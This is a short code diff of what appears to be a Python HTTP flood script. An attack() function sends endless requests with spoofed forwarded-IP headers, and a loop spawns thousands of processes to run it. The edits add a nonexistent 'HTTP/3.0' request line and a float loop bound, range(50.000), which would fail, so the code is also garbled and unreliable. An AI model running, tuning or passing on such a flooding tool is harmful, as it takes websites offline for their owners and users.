@@ -54,8 +54,8 @@ def randomip():
 def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD "  + url + " HTTP/2.2\r\nHost: " + ip + "\r\n"
+  forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
+  get_host = "GET "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -78,7 +78,7 @@ sleep(1)
 
 	
 def send2attack():
-  for i in range(10000): #Poder mágico
+  for i in range(50.000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
